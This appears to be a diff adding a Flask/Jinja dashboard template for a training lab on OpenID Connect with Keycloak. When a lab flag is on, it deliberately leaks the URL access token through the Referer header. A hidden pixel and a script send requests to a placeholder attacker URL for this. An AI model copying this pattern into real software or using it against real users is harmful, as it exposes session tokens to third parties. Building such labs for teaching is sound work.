@@ -1,0 +1,93 @@
+{% extends "base.html" %}
+{% block title %}Dashboard{% endblock %}
+
+{% block content %}
+
+<!-- ============================================================
+     A-06 VULNERABILITY ZONE
+     Quando vuln_a06=True, esta página carrega um recurso do
+     attacker server. O browser envia o header Referer com a
+     URL completa — incluindo o access_token que está na URL.
+     ============================================================ -->
+{% if vuln_a06 and token_in_url %}
+<div class="vuln-banner mb-3">
+  ⚠️ <strong>[VULN A-06]</strong> Token presente na URL.
+  Recurso externo a ser carregado de <code>{{ attacker_url }}</code>
+  — o browser vai enviar o Referer com o token.
+</div>
+
+<!-- RECURSO EXTERNO: o browser envia Referer ao carregar este pixel -->
+<img src="{{ attacker_url }}/pixel.gif"
+     width="1" height="1"
+     alt=""
+     onerror="console.log('[A-06] Attacker server recebeu o Referer com o token!')"
+     style="position:absolute;opacity:0.01;">
+
+<!-- Script alternativo (mais visível no browser) -->
+<script>
+  // [A-06] Força um fetch para o attacker server
+  // O browser inclui o header Referer automaticamente
+  var img = new Image();
+  img.src = "{{ attacker_url }}/log?source=sp1";
+</script>
+{% endif %}
+
+<!-- Dashboard principal -->
+<div class="row">
+  <div class="col-md-8">
+    <div class="card shadow-sm">
+      <div class="card-header card-header-portal">
+        <h5 class="mb-0">🏠 Dashboard — Portal A</h5>
+      </div>
+      <div class="card-body">
+        <p class="lead">Bem-vindo, <strong>{{ user.preferred_username }}</strong>!</p>
+        <p>Autenticação via <span class="badge bg-primary">OpenID Connect</span>
+           com Keycloak IdP.</p>
+
+        <table class="table table-bordered table-sm mt-3">
+          <tr><th>Username</th><td>{{ user.preferred_username }}</td></tr>
+          <tr><th>Email</th><td>{{ user.email }}</td></tr>
+          <tr><th>Roles</th><td>
+            {% for role in user.get('roles', []) %}
+              <span class="badge bg-{% if role == 'admin' %}danger{% else %}secondary{% endif %}">{{ role }}</span>
+            {% endfor %}
+          </td></tr>
+          <tr><th>Subject (sub)</th><td><small class="text-muted">{{ user.sub }}</small></td></tr>
+        </table>
+
+        <div class="d-flex gap-2 mt-3">
+          <a href="/profile" class="btn btn-outline-primary btn-sm">Ver Tokens</a>
+          {% if 'admin' in user.get('roles', []) %}
+            <a href="/admin" class="btn btn-danger btn-sm">Área Admin</a>
+          {% endif %}
+          <a href="http://localhost:5002" class="btn btn-outline-info btn-sm">→ Ir para Portal B (SSO)</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="col-md-4">
+    <!-- Painel de estado das vulnerabilidades -->
+    <div class="card shadow-sm">
+      <div class="card-header bg-dark text-white">
+        <small>🔬 Estado do Lab</small>
+      </div>
+      <div class="card-body p-2">
+        <table class="table table-sm table-borderless mb-0" style="font-size:0.8rem">
+          <tr>
+            <td>A-06 Referrer Leak</td>
+            <td>{% if vuln_a06 %}<span class="badge bg-danger">VULN</span>{% else %}<span class="badge bg-success">MITIGADO</span>{% endif %}</td>
+          </tr>
+        </table>
+        {% if token_in_url %}
+        <div class="mt-2 p-2 bg-warning-subtle rounded">
+          <small><strong>Token na URL:</strong><br>
+          <code style="word-break:break-all;font-size:0.65rem">{{ token_in_url[:80] }}...</code>
+          </small>
+        </div>
+        {% endif %}
+      </div>
+    </div>
+  </div>
+</div>
+{% endblock %}
